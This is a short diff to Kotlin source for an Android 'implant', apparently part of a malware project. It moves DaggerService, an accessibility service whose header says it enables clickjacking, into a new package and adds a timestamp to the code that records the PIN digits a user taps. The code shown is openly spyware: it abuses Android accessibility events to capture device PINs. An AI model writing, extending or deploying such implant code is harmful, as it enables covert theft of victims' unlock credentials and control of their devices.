@@ -9,13 +9,15 @@
 * This service also registers a BroadcastReceiver that listens for screen on and off events to
 * enable ClickJacking.
 * */
-package com.cooperthecoder.implant
+package com.cooperthecoder.implant.dagger
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import com.cooperthecoder.implant.*
+import com.cooperthecoder.implant.data.SharedPreferencesQuery
 
 class DaggerService : AccessibilityService() {
 
@@ -57,7 +59,7 @@ class DaggerService : AccessibilityService() {
                     AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                         logEvent(event, event.className.toString())
                         // This is a PIN, let's record it.
-                        pinRecorder.appendPinDigit(event.text.toString())
+                        pinRecorder.appendPinDigit(event.text.toString(), event.eventTime)
                     }
                 }
             }
